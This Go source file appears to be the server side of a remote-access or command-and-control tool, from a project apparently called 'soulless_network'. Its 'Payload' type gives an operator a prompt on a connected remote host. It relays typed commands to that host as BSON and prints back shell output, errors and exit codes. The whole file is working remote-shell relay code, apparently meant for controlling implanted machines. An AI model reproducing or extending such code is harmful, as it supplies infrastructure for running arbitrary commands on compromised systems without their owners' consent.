package server

import (
	"bufio"
	"fmt"
	"github.com/gookit/color"
	"github.com/mitchellh/mapstructure"
	"gopkg.in/mgo.v2/bson"
	"log"
	"net"
	"soulless_network/relations"
	"strings"
)

type Payload struct {
	Addr net.Addr
	Conn net.Conn
}

func (p *Payload) Activate(conn net.Conn) {
	for {
		pre := color.Blue.Text(fmt.Sprintf("<%s:#> ", p.Addr.String()))
		// 	writer := bufio.NewWriter(conn) doesn't work
		conn.Write([]byte(pre))

		text, err := receive(conn)

		if err != nil {
			log.Println("[UNIX] Receive unix input", err)
			break
		}

		if text == "exit" {
			break
		}

		o, err := p.handle(text, conn)

		if err != nil {
			conn.Write(append([]byte(err.Error()), '\n'))
			break
		}

		err = send(o, conn)

		if err != nil {
			log.Println("[UNIX] Send unix output", err)
			break
		}
	}
}

func (p *Payload) write(cmd *relations.Command) error {
	b, err := bson.Marshal(cmd)

	if err != nil {
		return err
	}

	_, err = p.Conn.Write(append(b, '\r'))

	if err != nil {
		return err
	}

	return nil
}

func (p *Payload) read() (*relations.Response, error) {
	reader := bufio.NewReader(p.Conn)
	b, err := reader.ReadBytes('\r')

	if err != nil {
		return nil, err
	}

	res := &relations.Response{}
	err = bson.Unmarshal(b, res)

	if err != nil {
		return nil, err
	}

	return res, nil
}

func (p *Payload) handle(text string, conn net.Conn) (string, error) {
	cmd := parse(text)

	err := p.write(cmd)

	if err != nil {
		return "", err
	}

	res, err := p.read()

	if err != nil {
		return "", err
	}

	o := dump(res)

	return o, nil
}

func dump(res *relations.Response) string {
	switch res.Type {
	case relations.TypeErrorResult:
		r := &relations.ErrorResult{}
		mapstructure.Decode(res.Data, r)

		return fmt.Sprintf("%s\nError code %d", r.Data, r.Code)
	case relations.TypeSystemResult:
		r := &relations.SystemResult{}
		mapstructure.Decode(res.Data, r)

		return fmt.Sprintf("Status %t", r.Status)
	case relations.TypeShellResult:
		r := &relations.ShellResult{}
		mapstructure.Decode(res.Data, r)

		if r.Exit != 0 {
			return fmt.Sprintf("%sExit %d", r.Stderr, r.Exit)
		} else {
			return fmt.Sprintf("%s", r.Stdout)
		}
	}

	return fmt.Sprintf("Unknown response\n%+v", res)
}

func send(o string, conn net.Conn) error {
	o = strings.TrimSpace(o)
	_, err := conn.Write(append([]byte(o), '\n'))
	return err
}

func receive(conn net.Conn) (string, error) {
	reader := bufio.NewReader(conn)
	text, err := reader.ReadString('\n')

	//if err == io.EOF {
	//	return "", err
	//}

	if err != nil {
		return "", err
	}

	text = strings.TrimSpace(text)
	return text, nil
}

func parse(text string) *relations.Command {
	p := &Parser{text}
	return p.Parse()
}
